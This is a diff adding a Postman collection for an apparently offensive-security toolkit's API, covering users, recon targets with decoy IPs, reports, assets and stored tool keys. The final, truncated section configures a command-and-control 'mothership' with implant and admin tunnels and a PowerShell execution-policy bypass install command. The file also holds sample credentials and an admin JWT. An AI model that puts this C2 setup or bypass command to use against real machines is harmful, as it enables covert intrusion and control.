@@ -1,0 +1,2312 @@
+{
+  "info": {
+    "_postman_id": "f39a2af9-515d-4e60-9882-11ce521a1509",
+    "name": "Odin",
+    "description": "This is the API collection for Odo Toolkit.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "7123356"
+  },
+  "item": [
+    {
+      "name": "users",
+      "item": [
+        {
+          "name": "Create User",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"UserID\": \"1234567\",\n      \"OwnerID\": \"12345\",\n      \"UserName\": \"test user\",\n      \"Email\": \"user2@mail.com\",\n      \"Password\": \"12345\",\n      \"Active\": true,\n      \"Anonymous\":  false,\n      \"Verify\": true,\n      \"Admin\": true\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/users/createuser",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "users",
+                "createuser"
+              ]
+            },
+            "description": "Creates a user."
+          },
+          "response": []
+        },
+        {
+          "name": "List Users",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ownerid\" : \"12345\",\n  \"verified\" : true,\n  \"active\" : true\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/users/listusers",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "users",
+                "listusers"
+              ]
+            },
+            "description": "List Users"
+          },
+          "response": []
+        },
+        {
+          "name": "List Admins",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ownerid\" : \"12345\",\n  \"verified\" : true,\n  \"active\" : true\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/users/listadmins",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "users",
+                "listadmins"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "auth",
+      "item": [
+        {
+          "name": "Login",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "\n\n\n{\n    \"email\":\"sam@mail.com\",\n    \"password\":\"12345\"\n}\n\n\n// {\n//     \"email\":\"user@mail.com\",\n//     \"password\":\"12345\"\n// }",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/login",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "login"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Logout",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "\t\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mzk0MzMwNzgsInVkIjp7IlVzZXJJZCI6IjEyMzQ1NiIsIlVzZXJOYW1lIjoidGVzdCB1c2VyIiwiQWRtaW4iOnRydWV9fQ._M8_5THD4FoXwuQbRQoITA8A76i2X64cfYj6PmK8yHs",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "url": {
+              "raw": "{{url_endpoint}}/api/logout",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "logout"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "recon",
+      "item": [
+        {
+          "name": "Create Scan",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"example\",\n    \"scantype\": \"Bug Bounty\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/createscan/",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "createscan",
+                ""
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Scans",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"example\",\n    \"scantype\": \"Bug Bounty\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/listscans?scantype=ALL",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "listscans"
+              ],
+              "query": [
+                {
+                  "key": "scantype",
+                  "value": "ALL"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Target",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"scanid\": \"12cbf5f4922792f5eb72d2972abe8483\",\n  \"host\": \"workingtarget.com\",\n  \"hostip\": \"1.1.1.1\",\n  \"targetip\": \"1.1.1.1\",\n  \"firewallName\": \"CloudFlare\",\n  \"decoys\": [\"8.8.8.8\",\"2.2.4.4\"]\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/createtarget",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "createtarget"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Recon Data",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"targetid\": \"60077e5848038468386282765ccd41b1\",\n  \"directories\": [\"domain.co/domain\",\"domain.com/another/endpoint\"],\n  \"parameters\": [\"domain.co/domain?dom=hacked\",\"domain.com/another/endpoint?name=end\"],\n  \"filepaths\": [\"domain.co/domain/domain.pdf\",\"domain.com/another/endpoint/endpoint.png\"]\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/createrecondata",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "createrecondata"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View Scan",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"example\",\n    \"scantype\": \"Bug Bounty\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/viewscans?scanid=12cbf5f4922792f5eb72d2972abe8483",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "viewscans"
+              ],
+              "query": [
+                {
+                  "key": "scanid",
+                  "value": "12cbf5f4922792f5eb72d2972abe8483"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Service",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"targetid\": \"60077e5848038468386282765ccd41b1\",\n  \"serviceName\": \"SSH\",\n  \"port\": 22,\n  \"protocol\": \"TCP\",\n  \"state\": true,\n  \"version\": \"2.2.2.2\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/createservice",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "createservice"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View Target",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              },
+              {
+                "key": "Date",
+                "value": "",
+                "type": "text",
+                "disabled": true
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"example\",\n    \"scantype\": \"Bug Bounty\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/viewtarget?scan-id=12cbf5f4922792f5eb72d2972abe8483&target-id=60077e5848038468386282765ccd41b1",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "viewtarget"
+              ],
+              "query": [
+                {
+                  "key": "scan-id",
+                  "value": "12cbf5f4922792f5eb72d2972abe8483"
+                },
+                {
+                  "key": "target-id",
+                  "value": "60077e5848038468386282765ccd41b1"
+                }
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Reports",
+      "item": [
+        {
+          "name": "Create Enum Type",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"Hardening-Guide\",\n    \"description\": \"Configuration standards for securing operating systems, databases, or network devices.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/enum/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "enum",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Enum Types",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"SOP-Wazuh Agent Installation\",\n    \"description\": \"Standard Operating Procedure for deploying Wazuh agents across various OS distributions.\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/enum/list?limit=50&offset=0",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "enum",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "limit",
+                  "value": "50"
+                },
+                {
+                  "key": "offset",
+                  "value": "0"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Categories",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"SOP-Wazuh Agent Installation\",\n    \"description\": \"Standard Operating Procedure for deploying Wazuh agents across various OS distributions.\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/category/list?limit=20",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "category",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "limit",
+                  "value": "20"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Category",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "\n\n{\"name\": \"Internal Controls\", \"parent_id\": 5}\n\n\n// {\n//     \"name\": \"Endpoint Security\",\n//     \"parent_id\": null\n// }\n// To create a main category, set parent_id to null or omit it.",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/category/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "category",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Search Blogs By Tag",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"SOP-Wazuh Agent Installation\",\n    \"description\": \"Standard Operating Procedure for deploying Wazuh agents across various OS distributions.\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/search/tag?tag=Audit&limit=10&offset=0",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "search",
+                "tag"
+              ],
+              "query": [
+                {
+                  "key": "tag",
+                  "value": "Audit"
+                },
+                {
+                  "key": "limit",
+                  "value": "10"
+                },
+                {
+                  "key": "offset",
+                  "value": "0"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Blog",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"title\": \"Quarterly Security Audit 2 - Q1 2026\",\n  \"author\": \"Asher Brown\",\n  \"maintag\": \"Audit-Report\",\n  \"types\": [\"Audit-Report\", \"Internal Controls\"],\n  \"categories\": [6, 7],\n  \"subcats\": [3],\n  \"tags\": [\"compliance\", \"security-audit\", \"2026\"],\n  \"public\": true,\n  \"archived\": false,\n  \"content\": \"<h1>Executive Summary</h1><p>The internal audit for Q1 2026 has been completed...</p>\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/createblog",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "createblog"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View Blog",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/viewblog?uuid=1CZq65ZLs_EVeN3RvwGaLHt",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "viewblog"
+              ],
+              "query": [
+                {
+                  "key": "uuid",
+                  "value": "1CZq65ZLs_EVeN3RvwGaLHt"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Update Blog",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"uuid\": \"1CZq7RzxA_3mEJ2Z1aJ4dQ2\",\n  \"title\": \"UPDATED: Quarterly Security Audit - Q1 2026\",\n  \"content\": \"<h1>Update</h1><p>Additional findings have been added to the remediation plan.</p>\",\n  \"maintag\": \"Audit-Report\",\n  \"public\": true,\n  \"archived\": false\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/updateblog/",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "updateblog",
+                ""
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Get Recent Blogs",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/getrecentblogs",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "getrecentblogs"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Get Blogs By Author",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/listblogsbyauthor/?author=Asher Brown&limit=10&offset=0",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "listblogsbyauthor",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "author",
+                  "value": "Asher Brown"
+                },
+                {
+                  "key": "limit",
+                  "value": "10"
+                },
+                {
+                  "key": "offset",
+                  "value": "0"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Get Blogs By Main Tag",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/listblogsbymaintag/?tag=Audit-Report",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "listblogsbymaintag",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "tag",
+                  "value": "Audit-Report"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Blogs By Type",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/listblogsbytype/?type=Pentesting Report",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "listblogsbytype",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "type",
+                  "value": "Pentesting Report"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Blog By Category ID",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/listblogsbycategory/?category=6",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "listblogsbycategory",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "category",
+                  "value": "6"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "UnArchive Blog",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/archiveblog/?uuid=1CZq6YMvX_N3EkFLbxUbHeC&archived=false",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "archiveblog",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "uuid",
+                  "value": "1CZq6YMvX_N3EkFLbxUbHeC"
+                },
+                {
+                  "key": "archived",
+                  "value": "false"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Archive Blog",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/archiveblog/?uuid=1CZq6YMvX_N3EkFLbxUbHeC&archived=true",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "archiveblog",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "uuid",
+                  "value": "1CZq6YMvX_N3EkFLbxUbHeC"
+                },
+                {
+                  "key": "archived",
+                  "value": "true"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Comment",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"blog_uuid\": \"1CZq65ZLs_EVeN3RvwGaLHt\",\n  \"commentor\": \"Jane Smith\",\n  \"comment\": \"The remediation steps for finding 1.2 have been verified.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/createcomment/",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "createcomment",
+                ""
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Comments",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"blog_uuid\": \"1CZq65ZLs_EVeN3RvwGaLHt\",\n  \"commentor\": \"Jane Smith\",\n  \"comment\": \"The remediation steps for finding 1.2 have been verified.\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/report/listcomments/?uuid=1CZq65ZLs_EVeN3RvwGaLHt&limit=20",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "report",
+                "listcomments",
+                ""
+              ],
+              "query": [
+                {
+                  "key": "uuid",
+                  "value": "1CZq65ZLs_EVeN3RvwGaLHt"
+                },
+                {
+                  "key": "limit",
+                  "value": "20"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "New Request",
+          "request": {
+            "method": "GET",
+            "header": []
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Assets",
+      "item": [
+        {
+          "name": "Create Asset",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"asset_name\": \"TEMP-SNSR-SRV\", \"description\": \"NetBotz Room Monitor 355\", \"active\": true, \"hardware\": true, \"describer\": {\"asset_type\": \"IoT Sensor\", \"location\": \"Server Room\", \"criticality\": \"Medium\", \"notes\": \"Alerts on humidity and temp spikes\"}}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/assets/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "assets",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Hardwares",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/assets/list?hardware=true",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "assets",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "hardware",
+                  "value": "true"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Softwares",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/assets/list?hardware=false",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "assets",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "hardware",
+                  "value": "false"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Active Inactive",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/assets/list?active=true&hardware=false",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "assets",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "active",
+                  "value": "true"
+                },
+                {
+                  "key": "hardware",
+                  "value": "false"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View Asset",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/assets/view?assetid=1CZqBueAV_uZnuvAM3QKLj4",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "assets",
+                "view"
+              ],
+              "query": [
+                {
+                  "key": "assetid",
+                  "value": "1CZqBueAV_uZnuvAM3QKLj4"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Update Asset",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"asset_id\": \"1CZqBfk25_gCGcm1gnWMt2z\",\n    \"asset_name\": \"Auth-Service-Pod\",\n    \"description\": \"Production Identity Provider v2.5\",\n    \"active\": true,\n    \"hardware\": false,\n    \"describer\": {\n        \"agentid\": \"k8s-node-09\",\n        \"ostype\": \"Alpine Linux\",\n        \"asset_type\": \"K8s Pod\",\n        \"location\": \"AWS us-east-1\",\n        \"criticality\": \"Critical\",\n        \"notes\": \"Upgraded to v2.5; increased memory limits to 2Gi.\",\n        \"obervability_tool\": \"Datadog\"\n    }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/assets/update",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "assets",
+                "update"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "UserApiKeys",
+      "item": [
+        {
+          "name": "Store APIKey",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "\n{\n    \"tool_name\": \"Meraki Firewall\",\n    \"credential_type\": \"oauth\",\n    \"active\": true,\n    \"data\": {\n        \"client_id\": \"x772839405060708090abcdef12345678\",\n        \"client_secret\": \"x772839405060708090abcdef12345678\"\n    }\n}\n\n// {\n//     \"tool_name\": \"VirusTotal-Enterprise\",\n//     \"credential_type\": \"apikey\",\n//     \"active\": true,\n//     \"data\": {\n//         \"api_key\": \"x772839405060708090abcdef12345678\"\n//     }\n// }",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/keys/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "keys",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List API Keys",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/keys/list",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "keys",
+                "list"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "New Request",
+          "request": {
+            "method": "GET",
+            "header": []
+          },
+          "response": []
+        },
+        {
+          "name": "Update ApiKey",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n        \"key_id\": \"1CaCTmkjM_HRgqPoK5gVSry\",\n        \"tool_name\": \"Meraki Firewall\",\n        \"ownerid\": \"ec1563a7-f3dc-4f2b-a03f-f551768aa4bb\",\n        \"credential_type\": \"oauth\",\n        \"data\": {\n            \"client_id\": \"x772839405060708090abcdef12345678\",\n            \"client_secret\": \"1234567890-p[o;lkjmnbgfvrete\"\n        },\n        \"active\": true\n    }",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/keys/update",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "keys",
+                "update"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Motherships",
+      "item": [
+        {
+          "name": "Create Mothership",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"Beta-C2-Backup\",\n    \"address\": \"45.77.88.22\",\n    \"implant_tunnel\": \"https://backup.beta.io/imp\",\n    \"admin_tunnel\": \"https://backup.beta.io/adm\",\n    \"description\": \"Redundant failover node located in US-East.\",\n    \"tls\": false,\n    \"active\": true,\n    \"generate_command\": \"powershell.exe -ExecutionPolicy Bypass -File install.ps1\",\n    \"machine_data\": \"{\\\"username\\\": \\\"Administrator\\\", \\\"os_type\\\": \\\"windows\\\", \\\"home_dir\\\": \\\"C:\\\\Users\\\\Admin\\\"}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
